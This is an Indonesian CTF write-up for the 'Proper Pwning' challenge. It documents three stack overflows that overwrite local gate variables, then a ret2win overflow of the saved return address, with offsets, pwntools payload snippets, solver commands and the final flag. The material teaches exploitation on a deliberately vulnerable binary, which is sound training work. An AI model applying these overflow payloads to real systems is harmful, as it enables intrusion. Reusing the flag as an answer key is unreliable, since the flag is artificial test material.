# Proper Pwning

## Ringkasan

Binary memiliki empat tahap:

1. Gate 1 meminta overwrite variabel lokal agar bernilai nonzero.
2. Gate 2 meminta overwrite `gate` tanpa merusak `baby_chicken`.
3. Gate 3 meminta nilai tepat `13371337`.
4. Treasure room memiliki buffer overflow besar yang dipakai untuk menimpa saved RIP dan lompat ke fungsi `win()`.

Tidak ada canary, binary non-PIE, dan fungsi `win()` sudah tersedia. Exploit akhirnya berupa tiga overwrite variabel lokal lalu ret2win.

## Proteksi binary

```bash
checksec --file=proper
```

Proteksi yang relevan:

```text
No canary
No PIE
NX enabled
```

NX tidak menjadi masalah karena exploit tidak menjalankan shellcode. Kita cukup mengarahkan alur eksekusi ke `win()`.

## Gate 1

Layout stack:

```text
buffer @ rbp-0x110
gate   @ rbp-0x4
```

Offset dari awal buffer ke `gate`:

```text
0x110 - 0x4 = 0x10c = 268
```

Program hanya mengecek apakah `gate` bernilai nonzero. Payload:

```python
gate1 = b"A" * 268 + b"\x01"
```

`gets()` menambahkan terminator NUL setelah byte terakhir. Karena hanya satu byte rendah yang perlu dibuat nonzero, payload tidak perlu menyentuh saved RBP.

## Gate 2

Layout stack:

```text
buffer       @ rbp-0x210
baby_chicken @ rbp-0x8
gate         @ rbp-0x4
```

Offset ke `baby_chicken`:

```text
0x210 - 0x8 = 0x208 = 520
```

`baby_chicken` harus tetap bernilai `41`, lalu `gate` dibuat nonzero:

```python
gate2 = b"B" * 520
gate2 += p32(41)
gate2 += b"\x01"
```

Empat byte pertama setelah padding memulihkan `baby_chicken`, lalu satu byte berikutnya mengubah `gate`.

## Gate 3

Layout stack:

```text
buffer @ rbp-0x50
gate   @ rbp-0x4
```

Offset:

```text
0x50 - 0x4 = 0x4c = 76
```

Target:

```text
13371337 decimal = 0x00cc07c9
```

Karena byte paling tinggi bernilai `00`, cukup kirim tiga byte rendah:

```python
gate3 = b"C" * 76 + p32(13371337)[:3]
```

Terminator NUL dari `gets()` menjadi byte keempat, sehingga nilai akhirnya tepat `0x00cc07c9`.

Setelah gate ketiga terbuka, program membocorkan alamat fungsi `win()`:

```text
The treasure is located at 0x...
```

Solver memakai leak tersebut agar tetap aman walaupun binary dikompilasi ulang.

## Treasure room

Buffer treasure room berada pada:

```text
buffer @ rbp-0x1a70
```

Ukuran buffer:

```text
0x1a70 = 6768
```

Offset ke saved RIP:

```text
6768 byte buffer
+ 8 byte saved RBP
= 6776 byte
```

Payload:

```python
treasure = b"D" * 6768
treasure += b"E" * 8
treasure += p64(ret)
treasure += p64(win)
```

Gadget `ret` tambahan dipakai untuk menjaga alignment stack 16-byte sebelum memasuki `win()`. Tanpa alignment ini, pemanggilan fungsi libc di dalam `win()` dapat gagal pada beberapa environment.

## Solver

Dependency:

```bash
python3 -m pip install pwntools
```

Jalankan dari folder yang berisi binary `proper`:

```bash
python3 solve.py 0.cloud.chals.io 21543
```

Untuk pengujian lokal:

```bash
python3 solve.py --local
```

Alur solver:

```text
Gate 1:
  268 padding + 0x01

Gate 2:
  520 padding + p32(41) + 0x01

Gate 3:
  76 padding + tiga byte rendah p32(13371337)

Treasure room:
  6768 padding + saved RBP + ret + win
```

## Output

```text
<FLAG>bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}</FLAG>
```

## Flag

```text
bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}
```
